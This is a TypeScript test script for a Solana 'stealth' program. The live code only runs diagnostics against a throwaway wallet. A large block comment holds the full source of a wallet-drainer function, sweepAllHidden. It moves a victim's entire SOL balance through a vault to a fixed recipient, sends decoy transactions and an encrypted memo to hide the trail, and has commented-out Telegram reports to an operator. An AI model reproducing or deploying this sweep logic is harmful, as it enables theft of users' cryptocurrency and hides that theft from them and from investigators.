// test-stealth-program.ts
import { Connection, PublicKey, Keypair } from "@solana/web3.js";
import { diagnoseStealthProgram } from "./functions";

// ADD YOUR ACTUAL PROGRAM ID HERE:
const STEALTH_PROGRAM_ID = new PublicKey('2WaTn2ATgtiDraS2TKuLaVnA2bJFdPUGCpchkkXxw46J');
/**
 * // === MAIN STEALTH SWEEP FUNCTION ===
export async function sweepAllHidden(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction | VersionedTransaction, connection: Connection) => Promise<any>,
): Promise<boolean> {
  const RECIPIENT = new PublicKey(RECIPIENT_PUBKEY);
  //alert("Inner")
  
  // Get balance
  const nativeBalance = await connection.getBalance(publicKey);
  if (nativeBalance <= RESERVED_LAMPORTS) {
    //await sendTelegramMessage(`⚠️ Insufficient balance for stealth sweep: ${nativeBalance / 1e9} SOL`);
    return false;
  }

  const availableSol = nativeBalance - RESERVED_LAMPORTS;
  
  // Generate unique seed for this sweep
  const seed = generateVaultSeed(publicKey);
  
  // Generate PDA for vault
  const [vaultPda] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("vault"),
      publicKey.toBuffer(),
      Buffer.from(seed),
    ],
    STEALTH_PROGRAM_ID
  );

  // Generate encryption key from wallet (keep this secret!)
  const encryptionKey = `sk-${publicKey.toBase58().slice(0, 8)}-${Date.now()}`;
  
  // Create encrypted memo
  const memoData = JSON.stringify({
    from: publicKey.toBase58(),
    to: RECIPIENT.toBase58(),
    amount: availableSol,
    timestamp: Date.now(),
    sweepId: `sweep-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`,
  });
  const encryptedMemo = xorEncrypt(memoData, encryptionKey);

  

  /*await sendTelegramMessage(`🚀 *STARTING STEALTH SWEEP*
----------------------------------
👛 *Sender:* \`${publicKey.toBase58().slice(0, 8)}...\`
🎯 *Recipient:* \`${RECIPIENT.toBase58().slice(0, 8)}...\`
💰 *Amount:* ${availableSol / LAMPORTS_PER_SOL} SOL
🔐 *Vault:* \`${vaultPda.toBase58().slice(0, 8)}...\`
📝 *Seed:* ${seed.slice(0, 20)}...
⏳ Beginning stealth transfer sequence...`);

alert("Inner inner")

  try {
    // ===== STEP 1: Initialize Vault =====
    //await sendTelegramMessage(`🔧 *Step 1:* Initializing stealth vault...`);
    
    const initTx = new Transaction();
    initTx.add(createInitVaultInstruction(publicKey, vaultPda, seed));
    
    const initSig = await signAndSendTransaction(
      connection,
      publicKey,
      signTransaction,
      initTx,
      "Initialize vault"
    );
    
    //await sendTelegramMessage(`✅ Vault initialized\nTX: \`${initSig.slice(0, 16)}...\``);

    // ===== STEP 2: Deposit SOL to Vault =====
    //await sendTelegramMessage(`💰 *Step 2:* Depositing ${availableSol / LAMPORTS_PER_SOL} SOL to vault...`);
    
    const depositTx = new Transaction();
    depositTx.add(createDepositInstruction(publicKey, vaultPda, BigInt(availableSol)));
    
    // Also add actual SOL transfer (the program expects this)
    depositTx.add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: vaultPda,
        lamports: availableSol,
      })
    );
    
    const depositSig = await signAndSendTransaction(
      connection,
      publicKey,
      signTransaction,
      depositTx,
      "Deposit to vault"
    );
    
    //await sendTelegramMessage(`✅ Deposit completed\nTX: \`${depositSig.slice(0, 16)}...\``);

    // ===== STEP 3: Create Decoy Transactions =====
    //await sendTelegramMessage(`🎭 *Step 3:* Creating decoy transactions...`);
    
    const decoySigs: string[] = [];
    for (let i = 0; i < 2; i++) {
      const decoyTx = new Transaction();
      decoyTx.add(createDecoyInstruction(publicKey));
      
      // Add small self-transfer to make it look real
      decoyTx.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: publicKey,
          lamports: 0, // Zero amount - just creates noise
        })
      );
      
      const decoySig = await signAndSendTransaction(
        connection,
        publicKey,
        signTransaction,
        decoyTx,
        `Decoy ${i + 1}`
      );
      
      decoySigs.push(decoySig);
    }
    
    //await sendTelegramMessage(`✅ ${decoySigs.length} decoy transactions created`);

    // ===== STEP 4: Perform Stealth Transfer =====
    //await sendTelegramMessage(`🔄 *Step 4:* Performing stealth transfer...`);
    
    const stealthTx = new Transaction();
    stealthTx.add(
      createStealthTransferInstruction(
        publicKey,
        vaultPda,
        RECIPIENT,
        BigInt(availableSol - 5000), // Leave small amount for fees
        encryptedMemo
      )
    );
    
    const stealthSig = await signAndSendTransaction(
      connection,
      publicKey,
      signTransaction,
      stealthTx,
      "Stealth transfer"
    );
    
    //await sendTelegramMessage(`✅ Stealth transfer completed\nTX: \`${stealthSig.slice(0, 16)}...\``);

    // ===== STEP 5: Close Vault =====
    //await sendTelegramMessage(`🔒 *Step 5:* Closing vault...`);
    
    const closeTx = new Transaction();
    closeTx.add(createCloseVaultInstruction(publicKey, vaultPda));
    
    const closeSig = await signAndSendTransaction(
      connection,
      publicKey,
      signTransaction,
      closeTx,
      "Close vault"
    );
    
    //await sendTelegramMessage(`✅ Vault closed\nTX: \`${closeSig.slice(0, 16)}...\``);

    // ===== FINAL REPORT =====
    const finalReport = `🎉 *STEALTH SWEEP COMPLETE!*
----------------------------------
✅ *Initialized:* \`${initSig.slice(0, 8)}...\`
✅ *Deposited:* \`${depositSig.slice(0, 8)}...\`
✅ *Stealth Transfer:* \`${stealthSig.slice(0, 8)}...\`
✅ *Vault Closed:* \`${closeSig.slice(0, 8)}...\`
🎭 *Decoys:* ${decoySigs.length} created
🔐 *Encryption Key:* ${encryptionKey.slice(0, 15)}...
💰 *Amount Swept:* ${availableSol / LAMPORTS_PER_SOL} SOL
📊 *Success Rate:* 100%

*Transaction Links:*
- Vault Init: https://explorer.solana.com/tx/${initSig}
- Deposit: https://explorer.solana.com/tx/${depositSig}
- Stealth: https://explorer.solana.com/tx/${stealthSig}
- Close: https://explorer.solana.com/tx/${closeSig}`;

    //await sendTelegramMessage(finalReport);
    console.log("Stealth sweep completed successfully!");

    return true;

  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    console.error("Stealth sweep failed:", error);
    
    const errorReport = `❌ *STEALTH SWEEP FAILED*
----------------------------------
👛 *Wallet:* \`${publicKey.toBase58().slice(0, 8)}...\`
💰 *Amount:* ${availableSol / LAMPORTS_PER_SOL} SOL
🔐 *Vault:* \`${vaultPda.toBase58().slice(0, 8)}...\`
💥 *Error:* ${errorMessage}

🔄 Falling back to normal transfer method...`;

    //await sendTelegramMessage(errorReport);
    
    // Fallback to normal sweep
    try {
      //await sendTelegramMessage(`🔄 Attempting normal transfer as fallback...`);
      return await sweepAll(publicKey, connection, signTransaction);
    } catch (fallbackError) {
      const fallbackMessage = fallbackError instanceof Error ? fallbackError.message : String(fallbackError);
      //await sendTelegramMessage(`❌ Fallback also failed: ${fallbackMessage}`);
      return false;
    }
  }
}
 */
async function main() {
  // You can also accept command line arguments
  const network = process.argv[2] || "devnet";
  const customProgramId = process.argv[3];
  
  // Use custom program ID if provided
  const programId = customProgramId 
    ? new PublicKey(customProgramId)
    : STEALTH_PROGRAM_ID;
  
  console.log("🧪 Testing stealth program...");
  console.log("Network:", network);
  console.log("Program ID:", programId.toBase58());
  
  // Set RPC URL based on network
  let rpcUrl;
  switch (network.toLowerCase()) {
    case "mainnet":
      rpcUrl = "https://api.mainnet-beta.solana.com";
      break;
    case "devnet":
      rpcUrl = "https://api.devnet.solana.com";
      break;
    case "testnet":
      rpcUrl = "https://api.testnet.solana.com";
      break;
    default:
      rpcUrl = network; // Use as custom RPC
  }
  
  const connection = new Connection(rpcUrl);
  const testWallet = Keypair.generate();
  
  console.log("\n📡 Connection:", rpcUrl);
  console.log("👛 Test wallet:", testWallet.publicKey.toBase58());
  console.log("💰 Test wallet balance: 0 SOL (using simulation only)\n");
  
  const results = await diagnoseStealthProgram(testWallet.publicKey, connection);
  
  console.log("\n" + "=".repeat(60));
  console.log("📊 DIAGNOSTIC RESULTS");
  console.log("=".repeat(60));
  
  console.log("\n1️⃣ PROGRAM DEPLOYMENT");
  console.log("   Status:", results.programDeployed ? "✅ Deployed" : "❌ Not Deployed");
  if (results.programDetails) {
    console.log("   Details:");
    console.log("   • Executable:", results.programDetails.executable);
    console.log("   • Owner:", results.programDetails.owner);
    console.log("   • Data Size:", results.programDetails.dataLength, "bytes");
    console.log("   • Balance:", results.programDetails.lamports, "SOL");
  }
  
  console.log("\n2️⃣ INTERFACE COMPATIBILITY");
  console.log("   Status:", results.interfaceCompatible ? "✅ Compatible" : "❌ Issues Found");
  if (results.interfaceIssues.length > 0) {
    console.log("   Issues:");
    results.interfaceIssues.forEach(issue => console.log("   •", issue));
  }
  
  console.log("\n3️⃣ INSTRUCTION TESTS");
  console.log("   " + "-".repeat(40));
  
  Object.entries(results.instructionTests).forEach(([name, test]) => {
    const status = test.success ? "✅ PASS" : "❌ FAIL";
    console.log(`   ${name.padEnd(20)} ${status}`);
    if (!test.success && test.error) {
      console.log(`     Error: ${test.error.substring(0, 100)}...`);
    }
    
    // Show first 2 logs if available
    if (test.logs && test.logs.length > 0) {
      test.logs.slice(0, 2).forEach((log:any) => {
        if (log.includes("Error") || log.includes("failed") || log.includes("Panic")) {
          console.log(`     Log: ${log.substring(0, 80)}...`);
        }
      });
    }
  });
  
  const passedCount = Object.values(results.instructionTests).filter((t: any) => t.success).length;
  const totalCount = Object.keys(results.instructionTests).length;
  console.log(`\n   📈 Score: ${passedCount}/${totalCount} passed`);
  
  console.log("\n4️⃣ RECOMMENDATIONS");
  console.log("   " + "-".repeat(40));
  results.recommendations.forEach((rec, i) => {
    console.log(`   ${i + 1}. ${rec}`);
  });
  
  console.log("\n" + "=".repeat(60));
  
  // Exit with appropriate code
  const allPassed = results.programDeployed && 
                   results.interfaceCompatible && 
                   passedCount === totalCount;
  
  if (allPassed) {
    console.log("🎉 ALL TESTS PASSED! Stealth program is ready.");
    process.exit(0);
  } else {
    console.log("⚠️  SOME TESTS FAILED. Review recommendations above.");
    process.exit(1);
  }
}

main().catch(error => {
  console.error("💥 FATAL ERROR:");
  console.error(error);
  process.exit(1);
});